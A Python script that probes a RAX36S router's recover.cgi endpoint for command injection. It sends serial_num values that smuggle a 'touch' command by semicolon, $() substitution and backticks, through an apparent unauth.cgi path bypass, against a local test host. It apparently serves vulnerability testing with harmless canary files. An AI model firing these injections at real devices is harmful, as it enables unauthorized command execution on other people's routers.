#!/usr/bin/env python3
"""Canary-only command-injection checks for RAX36S recovery parameters."""

from __future__ import annotations

import http.client
import urllib.parse


HOST = "127.0.0.1"
PORT = 25137


def post(path: str, values: dict[str, str]) -> int:
    body = urllib.parse.urlencode(values).encode("ascii")
    connection = http.client.HTTPConnection(HOST, PORT, timeout=8)
    try:
        connection.request(
            "POST",
            path,
            body,
            {
                "Host": "routerlogin.net",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(body)),
                "Connection": "close",
            },
        )
        response = connection.getresponse()
        response.read()
        return response.status
    finally:
        connection.close()


def main() -> int:
    cases = (
        ("semicolon", "x;touch${IFS}/tmp/FRIDAY_RAX36S_REC_SEMI"),
        ("substitution", "$(touch${IFS}/tmp/FRIDAY_RAX36S_REC_SUB)"),
        ("backticks", "`touch${IFS}/tmp/FRIDAY_RAX36S_REC_TICK`"),
    )
    for name, value in cases:
        status = post(
            "/recover.cgi?/unauth.cgi%20timestamp=00000000",
            {"submit_flag": "match_sn", "serial_num": value},
        )
        print(f"{name} status={status}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
